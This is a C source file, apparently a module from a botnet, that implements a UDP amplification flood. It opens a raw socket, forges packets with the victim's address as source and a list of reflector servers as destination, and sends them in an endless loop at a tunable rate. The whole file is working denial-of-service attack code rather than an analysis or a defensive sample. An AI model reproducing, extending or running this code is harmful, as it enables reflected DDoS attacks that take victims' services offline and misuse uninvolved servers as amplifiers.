#include <netinet/in.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/in.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

void flood_udpamp(pflood_context_t ctx) {
  size_t payload_len = 0;
  size_t sources_len = 0;
  int current_pps = 0, pps = 0;

  // port options
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);

  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);
  uint32_t *sources = flood_retrieve_iplist(ctx, OPT_SOURCES, &sources_len);

  // pps settings
  u32 minpps = flood_retrieve_u32(ctx, OPT_MINPPS, 0);
  u32 maxpps = flood_retrieve_u32(ctx, OPT_MAXPPS, 0);

  // gen random pps
  if (maxpps != 0 && minpps != 0 && maxpps > minpps) {
    pps = xoshiro_range(minpps, maxpps + 1);
  }

  if (!payload_len || !payload) {
    LOG_INFO("no payload");
    exit(0);
  }

  if (!sources_len || !sources) {
    LOG_INFO("no sources");
    exit(0);
  }

  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) {
    exit(0);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *ip = (struct iphdr *)packets[i];

    ip->version = IPVERSION;
    ip->ttl = IPDEFTTL;
    ip->protocol = IPPROTO_UDP;
    ip->ihl = 5;
    ip->tos = 0;
    ip->id = xoshiro_next() & 0xFFFF;

    ip->daddr = sources[i % sources_len];
    ip->saddr = target->address;
  }

  while (true) {
    // send targets
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];

      // setup hdr shit
      struct iphdr *iph = (struct iphdr *)packets[i];
      struct udphdr *udp = (struct udphdr *)(iph + 1);
      char *data = (char *)(udp + 1);

      // set randomized addr and total length
      target_random_addr(target);

      iph->daddr = sources[i % sources_len];
      iph->saddr = target->address;

      iph->id = xoshiro_next() & 0xFFFF;
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);

      // randomize source and port
      udp->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
      udp->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
      udp->len = htons(sizeof(struct udphdr) + payload_len);

      memcpy(data, payload, payload_len);

      // calc checksum
      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      udp->check = 0;
      udp->check = checksum_tcpudp(iph, udp, udp->len, sizeof(struct udphdr) + payload_len);

      sendto(fd, packets[i], ntohs(iph->tot_len), 0, (struct sockaddr *)&target->saddr,
             sizeof(struct sockaddr_in));
    }

    // limit the pps
    if (pps != 0 && ++current_pps >= pps) {
      sleep(1);
      current_pps = 0;
    }

    if (psleep > 0) usleep(psleep);
  }
}
